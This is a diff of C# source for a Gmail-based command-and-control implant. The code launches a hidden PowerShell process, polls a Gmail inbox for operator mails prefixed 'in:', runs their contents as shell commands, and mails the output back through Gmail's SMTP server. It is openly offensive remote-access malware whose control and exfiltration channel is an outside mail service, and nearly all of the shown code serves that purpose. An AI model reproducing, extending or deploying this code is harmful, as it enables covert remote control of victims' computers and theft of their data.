@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Threading;     // For using wait()
 using System.Net;           // For NetworkCredentials
 using System.Net.Mail;      // For mail operation
 using System.Reflection;    // For loading .NET assembly in-memory
@@ -16,12 +17,6 @@ namespace Gmail
 {
     class Program
     {
-        //public string GetString(string cmd)
-        //{
-        //    RunspaceConfiguration rc = Runspace.Create();
-
-        //}
-
         // ============ Command and Control through Gmail =============================
 
         static string smtpAddress = "smtp.gmail.com";
@@ -35,6 +30,14 @@ namespace Gmail
         static string emailToAddress = "conducting.experiment@gmail.com"; //Change to Receiver Email Address
 
         static string subject = "Data from Client:";
+
+        // Global Variables
+        public static string strConcat = "";
+        public static string body = "";
+        public static int Flag = 1;
+
+        // Change If needed
+        public static int wait = 5;
 
         public static void SendEmail(string info)
         {
@@ -59,38 +62,48 @@ namespace Gmail
         public static String[] ReadLastEmail(MailClient oClient, MailServer oServer, List<string> list_emails)
         {
             oClient.Connect(oServer);
+
+            // retrieve unread/new email only
+            oClient.GetMailInfosParam.Reset();
+            oClient.GetMailInfosParam.GetMailInfosOptions = GetMailInfosOptionType.NewOnly;
+
             MailInfo[] infos = oClient.GetMailInfos();
 
             // Only the last (recent/latest) Email
             for (int i = infos.Length - 1; i > infos.Length - 2; i--)
             {
                 MailInfo info = infos[i];
+
                 Mail oMail = oClient.GetMail(info);
-                //Console.WriteLine("\nSubject: {0}", oMail.Subject);
-                //Console.WriteLine(oMail.TextBody);
 
-                list_emails.Add(oMail.TextBody);
-                list_emails.Add("\nSubject of Mail Sent by Operator: " + oMail.Subject);
+                if (((oMail.TextBody.ToString()).Substring(0, 3)).Equals("in:"))
+                {
+                    list_emails.Add(oMail.TextBody);
+                    list_emails.Add("\nSubject of Mail Sent by Operator: " + oMail.Subject);
+
+                    //Console.WriteLine("[*] Text Body: {0}", oMail.TextBody);
+
+                    // mark unread email as read, next time this email won't be retrieved again
+                    if (!info.Read)
+                    {
+                        oClient.MarkAsRead(info, true);
+                    }
+                    //New Mail Exists
+                    Flag = 0;
+                }
+                else
+                {
+                    // Just sending string: "None" to get away from causing "System.ArgumentOutOfRangeException" when string.Substring is used to parse string.
+                    list_emails.Add("None");
+                }
             }
-
             String[] OrderFromC2 = list_emails.ToArray();
-            return OrderFromC2;
-        }
-
-        // Read last Email from a list of all unread Emails in the Inbox
-        public static String[] ReadLastUnreadEmail(MailClient oClient, MailServer oServer, List<string> list_emails)
-        {
-            // For reading only Unread Emails
-            oClient.GetMailInfosParam.GetMailInfosOptions = GetMailInfosOptionType.NewOnly;
-
-            String[] OrderFromC2 = ReadLastEmail(oClient, oServer, list_emails);
             return OrderFromC2;
         }
 
         public static String[] ReadEmail()
         {
             List<string> list_all_emails = new List<string>();
-            List<string> list_unread_emails = new List<string>();
 
             MailServer oServer = new MailServer(imapAddress, emailToAddress, password, ServerProtocol.Imap4);
 
@@ -102,64 +115,42 @@ namespace Gmail
 
             String[] Last_OrderFromC2_all_emails = ReadLastEmail(oClient, oServer, list_all_emails);
 
-            // Apply threading...
-            //Thread workerThread = new Thread(new ThreadStart(Print));
-
-            /*
-            String[] Last_OrderFromC2_unread_emails = ReadLastUnreadEmail(oClient, oServer, list_unread_emails);
-
-            // If last mail from all emails list == last mail from all unread emails list
-            // => last mail from all emails list is the the last unread mail.
-            if (Last_OrderFromC2_all_emails[0].Equals(Last_OrderFromC2_unread_emails[0]))
-            {
-                return Last_OrderFromC2_unread_emails;
-            }
-
-            String[] New = new string[] {};
-            return New;
-            */
             return Last_OrderFromC2_all_emails;
         }
 
         public static void GmailC2Prompt(string command)
         {
-            Console.WriteLine("[GmailC2] Command Sent> {0} ", command);
+            Console.WriteLine("\n[GmailC2] Command Sent> {0}\n", command);
         }
 
-        // Global Variables
-        public static string strConcat = "";
-        public static int i = 0;
-
-        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
 
             if (!String.IsNullOrEmpty(outLine.Data))
             {
-                Console.WriteLine("{0}. [Each line = one try]", i);
-
-                //Console.WriteLine("strOutput.Append(outLine.Data)");
                 strOutput.Append(outLine.Data);
 
-                strConcat += i + "." + strOutput.ToString() + "<br />";
+                strConcat += strOutput.ToString() + "<br />";
+            }
+        }
 
-                Console.WriteLine("strConcat: {0}\n", strConcat);
-                SendEmail(strConcat);
-
-                i++;
-
-                //catch (Exception err) { }
+        public static void WaitForCommand(int sec)
+        {
+            while (sec >= 0)
+            {
+                Console.WriteLine("[*] Waiting for {0} seconds for the Operator to send Command", sec);
+                Thread.Sleep(sec * 1000);
+                sec--;
             }
         }
 
         static void Main()
         {
-            //Console.WriteLine("===============");
-            //Console.WriteLine(OrderFromC2.ToLower().Substring(0,2));
-            //Console.WriteLine("===============");
-
+            //Console.WriteLine("\n[*] Starting 1\n");
             StringBuilder strInput = new StringBuilder();
 
+            // Opening New Powershell session
             Process p = new Process();
             p.StartInfo.FileName = "powershell.exe";
             p.StartInfo.CreateNoWindow = true;
@@ -170,82 +161,63 @@ namespace Gmail
             p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
             p.Start();
 
-            // Opening prompt
-            Console.WriteLine("1. p.StandardInput.WriteLine(strInput) \n");
-            p.StandardInput.WriteLine(strInput);
-
-            //Console.ReadLine();
-
             p.BeginOutputReadLine();
 
-            //Console.ReadLine();
-
+            //Console.WriteLine("\n[*] Entering While Loop...\n");
             while (true)
             {
                 try
                 {
+                    Console.WriteLine("\n[*] Reading MAil Inbox\n");
                     string[] OrderFromC2 = ReadEmail();
-                    string body = (OrderFromC2[0].ToLower()).Trim();
-
-                    GmailC2Prompt(body);
-
-                    // Chopping the indicator string out from cmd
-                    string indicator = body.Substring(0, 3);
-                    // Removing Indicator string from input cmd
-                    string cmd = body.Substring(3, (body.Length - 3));
-
-
-
-                    Console.WriteLine("\n==============================");
-                    Console.WriteLine("Body: \n{0}\n", body);
-                    Console.WriteLine("==============================\n");
-
-                    //Console.WriteLine("indicator: {0}", indicator);
-
-                    if (indicator.Equals("in:"))
+                    
+                    // Flag= 0 => New Mail Arrived
+                    if (Flag == 0)
                     {
-                        if ((cmd.Substring(0,6)).Equals("loader"))
+
+                        body = (OrderFromC2[0].ToLower()).Trim();
+
+                        if ((body.Substring(0, 3)).Equals("in:"))
                         {
-                            //string[] args = new[] { cmd };
-                            //for (i = 0; i < args.length; i++)
-                            //{
-                            //    console.writeline("args: {0}", args[i]);
-                            //}
+                            // Removing Indicator string from input cmd
+                            string cmd = body.Substring(3, (body.Length - 3));
 
-                            //console.readline();
+                            GmailC2Prompt(cmd);
 
-                            //worker.loader(args);
-                            //console.writeline("append loader part...");
+                            if (cmd.Equals("exit"))
+                            {
+                                Environment.Exit(0);
+                            }
+                            else
+                            {
+                                strInput.Append(cmd);
+
+                                //Console.WriteLine("p.StandardInput.WriteLine(strInput)");
+                                p.StandardInput.WriteLine(strInput);
+                                //Console.WriteLine("strInput.Remove(0, strInput.Length)");
+                                strInput.Remove(0, strInput.Length);
+                            }
                         }
-                        else
+                        else if (!(body.Substring(0, 3)).Equals("in:"))
                         {
-                            strInput.Append(cmd);
-
-                            //Console.WriteLine("In ...");
-                            //Console.WriteLine("strConcat: {0}", strConcat);
-                            //SendEmail(strConcat);
-
-                            Console.WriteLine("2. p.StandardInput.WriteLine(strInput)");
-                            p.StandardInput.WriteLine(strInput);
-
-                            Console.WriteLine("strInput.Remove(0, strInput.Length)");
-                            strInput.Remove(0, strInput.Length);
+                            SendEmail(strConcat);   
+                            // Updating Global Variables for next command input
+                            Flag = 1;
+                            strConcat = "";
                         }
                     }
-                    else if (!(indicator.Equals("in:")))
+                    else if(Flag == 1)
                     {
-                        //Console.WriteLine("indicator: {0}", indicator);
-                        //Console.WriteLine("indicator: Not equal to `in:`");
-                        //SendEmail("[+] Please add 'in:' before providing commands, like 'in:dir'");
-
-                        // Please Wait for new Email to arrive in inbox then read and respond continue the process...
+                        //will sleep for "wait" secs...
+                        //Console.WriteLine("Within Else if(Flag == 1)");
+                        WaitForCommand(wait);
                     }
                 }
-                // If the command sent by Operator is less than 3 chars
-                catch (ArgumentOutOfRangeException)
+                // For MailServerException
+                catch (MailServerException ex)
                 {
-                    Console.WriteLine("within catch");
-                    SendEmail("[+] Please add 'in:' before providing commands, like 'in:dir'");
+                    //Console.WriteLine("within catch");
+                    SendEmail("[!] Error caused: "+ex.ToString());
                 }
             }
         }
